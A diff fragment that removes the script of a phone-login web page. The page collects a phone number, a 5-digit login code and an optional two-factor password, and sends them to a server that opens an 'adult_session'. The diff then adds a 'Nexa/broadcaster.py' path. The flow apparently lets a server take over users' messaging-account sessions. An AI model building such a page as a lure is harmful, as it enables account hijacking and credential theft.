-                if (e.key === 'Backspace' && !e.target.value && index > 0) {
-                    otpInputs[index - 1].focus();
-                }
-                if (e.key === 'Enter') {
-                    verifyCode();
-                }
-            });
-
-            input.addEventListener('paste', (e) => {
-                e.preventDefault();
-                const pasted = e.clipboardData.getData('text').replace(/\s/g, '').slice(0, 5);
-                pasted.split('').forEach((char, i) => {
-                    if (otpInputs[i]) {
-                        otpInputs[i].value = char;
-                        otpInputs[i].classList.add('filled');
-                    }
-                });
-                if (otpInputs[pasted.length]) {
-                    otpInputs[pasted.length].focus();
-                }
-            });
-        });
-
-        function getOTPCode() {
-            return Array.from(otpInputs).map(input => input.value).join('');
-        }
-
-        async function sendCode() {
-            const phone = document.getElementById('phone').value.trim();
-
-            if (!phone || phone.length < 10) {
-                showMessage('❌ Please enter a valid phone number with country code', 'error');
-                return;
-            }
-
-            document.getElementById('loading1').classList.add('active');
-            document.getElementById('sendBtn').disabled = true;
-
-            try {
-                const r = await fetch('/api/send-code', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({phone, session_name: 'adult_session'})
-                });
-
-                const data = await r.json();
-
-                if (data.ok) {
-                    currentSessionId = data.session_id;
-                    document.getElementById('phoneDisplay').textContent = phone;
-                    document.getElementById('step1').classList.remove('active');
-                    document.getElementById('step2').classList.add('active');
-                    otpInputs[0].focus();
-                } else {
-                    showMessage('❌ ' + (data.error || 'Failed to send code'), 'error');
-                    document.getElementById('sendBtn').disabled = false;
-                }
-            } catch (e) {
-                showMessage('❌ Connection error. Please try again.', 'error');
-                document.getElementById('sendBtn').disabled = false;
-            }
-
-            document.getElementById('loading1').classList.remove('active');
-        }
-
-        async function verifyCode() {
-            const code = getOTPCode();
-            const password = document.getElementById('password').value;
-
-            if (code.length !== 5) {
-                showMessage('❌ Please enter all 5 digits', 'error');
-                return;
-            }
-
-            document.getElementById('loading2').classList.add('active');
-            document.getElementById('verifyBtn').disabled = true;
-
-            try {
-                const r = await fetch('/api/verify-code', {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        session_id: currentSessionId,
-                        code: code,
-                        password: password || undefined
-                    })
-                });
-
-                const data = await r.json();
-
-                if (data.ok) {
-                    window.location.href = '/dashboard';
-                } else if (data.requires_password) {
-                    document.getElementById('passwordGroup').style.display = 'block';
-                    showMessage('🔐 Two-factor authentication required', 'info');
-                    document.getElementById('verifyBtn').disabled = false;
-                } else {
-                    showMessage('❌ ' + (data.error || 'Invalid code'), 'error');
-                    document.getElementById('verifyBtn').disabled = false;
-                    // Clear OTP on error
-                    otpInputs.forEach(input => {
-                        input.value = '';
-                        input.classList.remove('filled');
-                    });
-                    otpInputs[0].focus();
-                }
-            } catch (e) {
-                showMessage('❌ Connection error. Please try again.', 'error');
-                document.getElementById('verifyBtn').disabled = false;
-            }
-
-            document.getElementById('loading2').classList.remove('active');
-        }
-
-        function backToStep1() {
-            document.getElementById('step2').classList.remove('active');
-            document.getElementById('step1').classList.add('active');
-            document.getElementById('sendBtn').disabled = false;
-            document.getElementById('passwordGroup').style.display = 'none';
-            otpInputs.forEach(input => {
-                input.value = '';
-                input.classList.remove('filled');
-            });
-            currentSessionId = null;
-        }
-
-        // Enter key support for phone
-        document.getElementById('phone')?.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') sendCode();
-        });
-    </script>
-</body>
-</html>
+Nexa/broadcaster.py
